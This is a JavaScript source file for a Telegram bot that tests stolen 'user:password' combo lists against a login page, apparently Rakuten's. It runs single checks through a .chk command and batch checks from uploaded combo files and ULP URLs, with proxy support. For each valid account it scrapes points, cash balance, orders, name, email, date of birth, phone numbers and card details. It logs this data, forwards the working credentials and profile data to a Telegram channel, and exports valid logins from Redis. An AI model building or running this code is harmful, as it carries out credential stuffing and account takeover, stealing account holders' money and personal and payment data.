const { Telegraf, Markup } = require('telegraf');

// HTTP-based credential checker
const { checkCredentials } = require('./httpChecker');
const { closeSession } = require('./automation/http/sessionManager');
const { captureAccountData } = require('./automation/http/httpDataCapture');
const { registerBatchHandlers, abortActiveBatch, hasActiveBatch } = require('./telegram/batchHandlers');
const { registerCombineHandlers, hasSession: hasCombineSession, addFileToSession, TELEGRAM_FILE_LIMIT_BYTES } = require('./telegram/combineHandler');
const { abortCombineBatch, hasCombineBatch, getActiveCombineBatch } = require('./telegram/combineBatchRunner');
const { registerExportHandler } = require('./telegram/exportHandler');
const { forwardValidToChannel } = require('./telegram/channelForwarder');
const { getRedisClient, initProcessedStore } = require('./automation/batch/processedStore');
const {
  buildStartMessage,
  buildHelpMessage,
  buildGuideMessage,
  buildGuardError,
  buildCheckQueued,
  buildCheckProgress,
  buildCheckResult,
  buildCheckAndCaptureResult,
  buildCheckError,
  buildCapturePrompt,
  buildCaptureExpired,
  buildCaptureSummary,
  buildCaptureFailed,
  buildCaptureSkipped,
  escapeV2,
  codeV2,
  formatBytes,
  formatDurationMs,
} = require('./telegram/messages');
const fs = require('fs').promises;
const { createLogger } = require('./logger');

const log = createLogger('telegram');

/**
 * Parse ALLOWED_USER_IDS from environment variable.
 * Supports comma-separated list of Telegram user IDs.
 * @returns {Set<number>|null} Set of allowed user IDs, or null if not configured (allow all)
 */
function parseAllowedUserIds() {
  const raw = process.env.ALLOWED_USER_IDS;
  if (!raw || !raw.trim()) return null; // No allowlist = allow all
  
  const ids = raw
    .split(',')
    .map((id) => parseInt(id.trim(), 10))
    .filter((id) => !isNaN(id) && id > 0);
  
  if (ids.length === 0) return null;
  return new Set(ids);
}

/**
 * Check if a user is allowed to use the bot.
 * @param {number} userId - Telegram user ID
 * @param {Set<number>|null} allowedIds - Set of allowed IDs (null = allow all)
 * @returns {boolean}
 */
function isUserAllowed(userId, allowedIds) {
  if (!allowedIds) return true; // No allowlist configured = allow all
  return allowedIds.has(userId);
}

/**
 * Validates and parses the credential string format "user:pass".
 * @param {string} credentialString - Raw credential string
 * @returns {Object|null} { username, password } or null if invalid
 */
function parseCredentials(credentialString) {
  if (!credentialString || typeof credentialString !== 'string') {
    return null;
  }

  const parts = credentialString.split(':');
  if (parts.length < 2) {
    return null;
  }

  // First part is username, rest is password (handles passwords with colons)
  const username = parts[0].trim();
  const password = parts.slice(1).join(':').trim();
  
  if (!username || !password) {
    return null;
  }

  return { username, password };
}

/**
 * Validates email format.
 * @param {string} email - Email to validate
 * @returns {boolean} True if valid email format
 */
function isValidEmail(email) {
  if (!email || typeof email !== 'string') {
    return false;
  }

  const trimmed = email.trim();
  if (!trimmed || trimmed.length > 254) {
    return false;
  }

  const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return pattern.test(trimmed);
}

/**
 * Basic input guard to keep Telegram commands tidy and safe.
 * @param {string} raw - Raw credential string
 * @returns {{valid: boolean, error?: string}}
 */
function guardInput(raw) {
  if (!raw || typeof raw !== 'string') {
    return { valid: false, error: 'Provide credentials in the form `.chk user:password`.' };
  }

  const input = raw.trim();
  if (!input) {
    return { valid: false, error: 'Provide credentials in the form `.chk user:password`.' };
  }

  if (input.length > 200) {
    return { valid: false, error: 'Input too long (max 200 characters).' };
  }

  if (input.includes('\n')) {
    return { valid: false, error: 'Use a single-line `user:password` pair.' };
  }

  const parts = input.split(':');
  if (parts.length < 2) {
    return { valid: false, error: 'Use format `user:password` (colon-separated).' };
  }

  // First part is username, rest is password (handles passwords with colons)
  const user = parts[0].trim();
  const pass = parts.slice(1).join(':').trim();
  
  if (!user || !pass) {
    return { valid: false, error: 'Both user and password are required.' };
  }

  return { valid: true };
}

/**
 * Initializes and sets up the Telegram handler.
 * @param {string} botToken - Telegram bot token
 * @param {Object} [options] - Optional configuration
 * @returns {Telegraf} Configured bot instance
 */
function initializeTelegramHandler(botToken, options = {}) {
  const bot = new Telegraf(botToken);
  
  // Parse allowed user IDs from environment
  const allowedUserIds = parseAllowedUserIds();
  if (allowedUserIds) {
    log.info(`User allowlist enabled: ${allowedUserIds.size} user(s) allowed`);
  } else {
    log.info('User allowlist disabled (ALLOWED_USER_IDS not set) - all users allowed');
  }
  
  // Middleware: Check if user is allowed to use the bot
  bot.use(async (ctx, next) => {
    const userId = ctx.from?.id;
    if (!userId) {
      log.debug('No user ID in context, skipping allowlist check');
      return next();
    }
    
    if (!isUserAllowed(userId, allowedUserIds)) {
      log.warn(`Unauthorized access attempt by user ID: ${userId}`);
      // Silently ignore unauthorized users (no response)
      return;
    }
    
    return next();
  });

  // Handle /start command
  bot.start(async (ctx) => {
    await ctx.reply(buildStartMessage(), {
      parse_mode: 'MarkdownV2',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('▶️ Check Now', 'chk_prompt')],
        [Markup.button.callback('📖 Guide', 'guide'), Markup.button.callback('ℹ️ Help', 'help')],
      ]),
    });
  });

  // Handle /help command
  bot.command('help', async (ctx) => {
    await ctx.reply(buildHelpMessage(), { parse_mode: 'MarkdownV2' });
  });

  // Handle /stop command - abort active batch or clear combine session
  bot.command('stop', async (ctx) => {
    const chatId = ctx.chat.id;
    
    // Check for active combine batch first (highest priority)
    if (hasCombineBatch(chatId)) {
      const combineBatch = getActiveCombineBatch(chatId);
      abortCombineBatch(chatId);
      const ackMsg = await ctx.reply(escapeV2('⏹ Stopping combine batch...'), { parse_mode: 'MarkdownV2' });
      
      // Wait for batch to finish with timeout
      if (combineBatch && combineBatch._completionPromise) {
        const ABORT_TIMEOUT_MS = 30000;
        await Promise.race([
          combineBatch._completionPromise,
          new Promise(resolve => setTimeout(resolve, ABORT_TIMEOUT_MS)),
        ]);
        try {
          await ctx.telegram.deleteMessage(chatId, ackMsg.message_id);
        } catch (_) {}
      }
      return;
    }
    
    // Check for active regular batch
    if (hasActiveBatch(chatId)) {
      const result = abortActiveBatch(chatId);
      const ackMsg = await ctx.reply(escapeV2('⏹ Stopping batch...'), { parse_mode: 'MarkdownV2' });
      
      // Wait for batch to actually finish so the summary message gets updated
      if (result.batch && result.batch._completionPromise) {
        await result.batch._completionPromise;
        // Delete the ack message since batch summary is shown
        try {
          await ctx.telegram.deleteMessage(chatId, ackMsg.message_id);
        } catch (_) {}
      }
      return;
    }
    
    // Check for combine session in file collection mode
    if (hasCombineSession(chatId)) {
      const { clearSession } = require('./telegram/combineHandler');
      clearSession(chatId);
      log.info(`[stop] cleared combine session chatId=${chatId}`);
      await ctx.reply(escapeV2('⏹ Combine session cleared.'), { parse_mode: 'MarkdownV2' });
      return;
    }
    
    // Nothing to stop
    await ctx.reply(escapeV2('⚠️ No active batch or combine session to stop.'), { parse_mode: 'MarkdownV2' });
  });

  // Register combine handlers (must be before batch handlers to intercept files in combine mode)
  const combineHelpers = registerCombineHandlers(
    bot,
    { ...options, checkCredentials },
    { escapeV2, formatBytes, formatDurationMs }
  );

  // Register batch handlers (HOTMAIL uploads and ULP URLs)
  registerBatchHandlers(
    bot,
    { ...options, checkCredentials },
    { escapeV2, formatBytes, formatDurationMs }
  );

  // Register export handler (export VALID credentials from Redis)
  // Initialize processed store first to ensure Redis connection is ready
  initProcessedStore().then(() => {
    registerExportHandler(bot, getRedisClient);
  }).catch((err) => {
    log.warn(`Export handler setup failed: ${err.message}`);
  });

  // Handle .chk command
  bot.hears(/^\.chk\s+(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const credentialString = ctx.match[1].trim();
    const startedAt = Date.now();
    const maskUser = (user) => {
      if (!user || user.length < 3) return '***';
      return `${user.slice(0, 3)}***${user.slice(-2)}`;
    };

    // Guard input
    const guard = guardInput(credentialString);
    if (!guard.valid) {
      await ctx.reply(buildGuardError(guard.error), { parse_mode: 'MarkdownV2' });
      return;
    }

    // Parse credentials
    const creds = parseCredentials(credentialString);
    if (!creds) {
      await ctx.reply(buildGuardError('Failed to parse credentials. Format: `.chk username:password`'), {
        parse_mode: 'MarkdownV2',
      });
      return;
    }

    log.info(`[chk] start user=${maskUser(creds.username)}`);

    // Send processing message (will be edited later)
    const statusMsg = await ctx.reply(buildCheckQueued(), { parse_mode: 'MarkdownV2' });

    const updateStatus = async (text) => {
      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, text, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        log.warn('Status edit failed:', err.message);
      }
    };

    try {
      // Keep creds in state for follow-up capture summary (masked via spoiler later).
      ctx.state.lastUsername = creds.username;
      ctx.state.lastPassword = creds.password;

      // Check credentials
      const result = await checkCredentials(
        creds.username,
        creds.password,
        {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          screenshotOn: options.screenshotOn || false,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
          headless: options.headless,
          deferCloseOnValid: true, // keep session open for optional capture flow
          onProgress: async (phase) => {
            await updateStatus(buildCheckProgress(phase));
          },
        }
      );

      // Format result message with masked username
      const durationMs = Date.now() - startedAt;
      log.info(`[chk] finish status=${result.status} user=${maskUser(creds.username)} time=${durationMs}ms`);
      
      // Edit message with final result
      await updateStatus(buildCheckResult(result, creds.username, durationMs, creds.password));

      // Always remove any screenshot file quietly
      if (result.screenshot) {
        await fs.unlink(result.screenshot).catch(() => {});
      }

      // Automatically capture data if credentials are VALID
      if (result.status === 'VALID' && result.session) {
        try {
          log.info(`[chk] capturing account data...`);
          await updateStatus(buildCheckProgress('capture'));
          
          const capture = await captureAccountData(result.session, { timeoutMs: options.timeoutMs || 60000 });
          const finalMessage = buildCheckAndCaptureResult(result, capture, creds.username, durationMs, creds.password);
          await updateStatus(finalMessage);

          log.info(`[chk] captured: points=${capture.points} rank=${capture.rank} cash=${capture.cash} lastOrder=${capture.latestOrder} orderId=${capture.latestOrderId}`);
          if (capture.profile) {
            const phones = [capture.profile.mobilePhone, capture.profile.homePhone, capture.profile.fax].filter(Boolean).join('/') || 'n/a';
            log.info(`[chk] profile: name=${capture.profile.name} (${capture.profile.nameKana || ''}) email=${capture.profile.email} dob=${capture.profile.dob} phone=${phones}`);
            if (capture.profile.cards && capture.profile.cards.length > 0) {
              capture.profile.cards.forEach((card, idx) => {
                log.info(`[chk] card[${idx}]: ${card.brand} ****${card.last4} exp=${card.expiry} owner=${card.owner}`);
              });
            }
          }
          
          // Forward to channel (if configured)
          await forwardValidToChannel(ctx.telegram, creds.username, creds.password, capture);
        } catch (captureErr) {
          log.warn(`[chk] capture failed: ${captureErr.message}`);
          // Still show the check result even if capture failed
          await updateStatus(buildCheckResult(result, creds.username, durationMs, creds.password));
        } finally {
          // Clean up session
          closeSession(result.session);
        }
      } else if (result.status === 'VALID' && !result.session) {
        log.warn(`[chk] no session for capture (deferCloseOnValid=false?)`);
      }
    } catch (err) {
      log.error('Credential check error:', err.message);
      log.error(`[chk] error user=${maskUser(creds.username || 'unknown')} msg=${err.message}`);
      
      // Edit status message to show error
      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, buildCheckError(err.message), {
          parse_mode: 'MarkdownV2',
        });
      } catch (editErr) {
        await ctx.reply(buildCheckError(err.message), { parse_mode: 'MarkdownV2' });
      }
    }
  });

  // Handle inline button callbacks
  bot.action('chk_prompt', async (ctx) => {
    try {
      await ctx.answerCbQuery();
      await ctx.deleteMessage();
      await ctx.reply(
        'Send your credentials in the format:\n\n' +
        codeV2('.chk email:password') +
        '\n\nExample:\n' +
        codeV2('.chk user@rakuten.co.jp:mypass123'),
        {
          parse_mode: 'MarkdownV2',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('▶️ Check Now', 'chk_prompt')],
            [Markup.button.callback('📖 Guide', 'guide'), Markup.button.callback('ℹ️ Help', 'help')],
          ]),
        }
      );
    } catch (err) {
      log.warn(`Callback error (chk_prompt): ${err.message}`);
    }
  });

  bot.action('guide', async (ctx) => {
    try {
      await ctx.answerCbQuery();
      await ctx.deleteMessage();
      await ctx.reply(buildGuideMessage(), {
        parse_mode: 'MarkdownV2',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('▶️ Check Now', 'chk_prompt')],
          [Markup.button.callback('📖 Guide', 'guide'), Markup.button.callback('ℹ️ Help', 'help')],
        ]),
      });
    } catch (err) {
      log.warn(`Callback error (guide): ${err.message}`);
    }
  });

  bot.action('help', async (ctx) => {
    try {
      await ctx.answerCbQuery();
      await ctx.deleteMessage();
      await ctx.reply(buildHelpMessage(), {
        parse_mode: 'MarkdownV2',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('▶️ Check Now', 'chk_prompt')],
          [Markup.button.callback('📖 Guide', 'guide'), Markup.button.callback('ℹ️ Help', 'help')],
        ]),
      });
    } catch (err) {
      log.warn(`Callback error (help): ${err.message}`);
    }
  });

  // Launch bot
  bot.launch();
  
  log.success('Bot launched successfully!');

  return bot;
}

module.exports = {
  initializeTelegramHandler,
  parseCredentials,
  guardInput,
  isValidEmail,
  parseAllowedUserIds,
  isUserAllowed,
};
